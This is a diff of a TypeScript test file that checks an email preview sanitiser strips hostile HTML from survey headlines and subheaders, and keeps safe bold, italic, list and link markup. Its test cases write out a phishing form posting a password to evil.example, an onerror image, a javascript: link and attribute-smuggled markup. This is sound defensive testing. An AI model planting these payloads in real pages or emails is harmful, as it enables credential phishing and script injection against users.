@@ -474,18 +474,61 @@ describe("preview email with a hostile headline or subheader", () => {
     );
   };
 
+  const phishingParts = ["<img", "onerror", "<form", "<input", "<button", "evil.example"];
+
   test.each([
-    ["a class", `<p class="<body>${phishing}">a</p><p class="</body>">b</p>`],
-    ["a data attribute", `<p data-a="<body>${phishing}">a</p><p data-a="</body>">b</p>`],
-    ["an aria attribute", `<p aria-label="<body>${phishing}">a</p><p aria-label="</body>">b</p>`],
-    ["a doctype in a class", `<p class="X<!DOCTYPE">a</p><p class="${phishing}">b</p>`],
-  ])("keeps markup hidden in %s out of the email", async (_case, html) => {
+    [
+      "a form",
+      '<p>Hi</p><form action="https://evil.example/steal"><input name="password"><button>Log in</button></form>',
+      ["<form", "<input", "<button", "evil.example"],
+    ],
+    ["an image with an error handler", '<p>Photo</p><img src="x" onerror="alert(1)">', ["<img", "onerror"]],
+    ["a javascript: link", '<p><a href="javascript:alert(1)">click</a></p>', ["javascript:"]],
+    ["an inline style", '<p><span style="position:fixed;top:0">covered</span></p>', ["position:fixed"]],
+    ["markup hidden in a class", `<p class="<body>${phishing}">a</p><p class="</body>">b</p>`, phishingParts],
+    [
+      "markup hidden in a data attribute",
+      `<p data-a="<body>${phishing}">a</p><p data-a="</body>">b</p>`,
+      phishingParts,
+    ],
+    [
+      "markup hidden in an aria attribute",
+      `<p aria-label="<body>${phishing}">a</p><p aria-label="</body>">b</p>`,
+      phishingParts,
+    ],
+    ["a doctype hidden in a class", `<p class="X<!DOCTYPE">a</p><p class="${phishing}">b</p>`, phishingParts],
+  ])("keeps %s out of the email", async (_case, html, forbidden) => {
     for (const field of ["headline", "subheader"] as const) {
       const document = await renderWith(field, html);
 
       for (const output of [document, extractEmailBodyFragment(document)]) {
-        for (const fragment of ["<img", "onerror", "<form", "<input", "<button", "evil.example"]) {
+        for (const fragment of forbidden) {
           expect(output).not.toContain(fragment);
+        }
+      }
+    }
+  });
+
+  test("keeps the editor's bold, italics, lists and links", async () => {
+    const html =
+      '<p class="fb-editor-paragraph"><b><strong class="fb-editor-text-bold">Bold</strong></b> ' +
+      '<i><em class="fb-editor-text-italic">italic</em></i> ' +
+      '<a href="https://formbricks.com/docs" target="_blank" rel="noopener">link</a></p>' +
+      '<ul class="fb-editor-list-ul"><li class="fb-editor-listitem" value="1">item</li></ul>';
+
+    for (const field of ["headline", "subheader"] as const) {
+      const document = await renderWith(field, html);
+
+      for (const output of [document, extractEmailBodyFragment(document)]) {
+        // `render` pretty-prints, so compare without the whitespace it adds.
+        const compact = output.replaceAll(/\s+/g, "");
+        for (const kept of [
+          ">Bold</strong>",
+          ">italic</em>",
+          'href="https://formbricks.com/docs"',
+          ">item</li>",
+        ]) {
+          expect(compact).toContain(kept);
         }
       }
     }
